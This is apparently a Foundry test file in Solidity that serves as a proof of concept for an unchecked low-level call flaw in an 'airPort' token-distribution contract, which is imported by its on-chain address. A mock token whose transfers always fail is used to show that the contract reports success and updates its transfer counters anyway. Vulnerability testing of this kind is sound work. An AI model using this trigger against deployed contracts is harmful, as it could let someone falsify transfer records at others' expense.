// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol";

contract AirPortTest is Test {
    airPort port;
    address feeCollector = address(0x1);
    address tokenContract = address(0x2);
    address attacker = address(0x3);
    address victim = address(0x4);

    function setUp() public {
        vm.prank(feeCollector);
        port = new airPort();
    }

    // Test that demonstrates the unchecked low-level call vulnerability
    function testUncheckedLowLevelCall() public {
        // Create a mock token contract that will fail transfers
        MockToken mockToken = new MockToken();
        
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;

        // BEFORE: State queries
        uint256 initialTotalTransfers = port.totalTransfers(victim);
        uint256 initialTokenTransfers = port.userTokenTransfers(victim, address(mockToken));
        
        console.log("--- BEFORE-Trigger State ---");
        console.log("Total transfers for victim:", initialTotalTransfers);
        console.log("User token transfers for victim and mock token:", initialTokenTransfers);

        console.log("--- Trigger Transfer Call ---");
        // Perform transfer that will fail silently
        vm.prank(victim);
        bool success = port.transfer(
            victim,
            address(mockToken),
            recipients,
            100 ether
        );

        // Function must return true to demonstrate vulnerability
        assertTrue(success);
        console.log("Transfer result (expected true):", success);

        // AFTER: State queries
        uint256 afterTotalTransfers = port.totalTransfers(victim);
        uint256 afterTokenTransfers = port.userTokenTransfers(victim, address(mockToken));
        
        console.log("--- AFTER-Trigger State ---");
        console.log("Total transfers for victim:", afterTotalTransfers);
        console.log("User token transfers for victim and mock token:", afterTokenTransfers);
        
        // State comparison
        console.log("--- State Comparison ---");
        console.log("Total transfers changes: %d -> %d (Delta: %d)",
            initialTotalTransfers,
            afterTotalTransfers,
            afterTotalTransfers - initialTotalTransfers
        );
        console.log("Token transfers changes: %d -> %d (Delta: %d)",
            initialTokenTransfers,
            afterTokenTransfers,
            afterTokenTransfers - initialTokenTransfers
        );
        
        // Vulnerability verdict
        if (initialTotalTransfers != afterTotalTransfers || 
            initialTokenTransfers != afterTokenTransfers) {
            console.log("Vulnerability Exists: State variables updated despite failed token transfer");
            console.log("Vulnerability Exists: State variables modified during failed token transfers");
        } else {
            console.log("Vulnerability not Exist: State variables unchanged");
            console.log("Vulnerability not Exist: State variables remain unchanged during failed transfers");
        }
    }
}

// Mock token contract that always fails transfers
contract MockToken {
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return false;
    }
}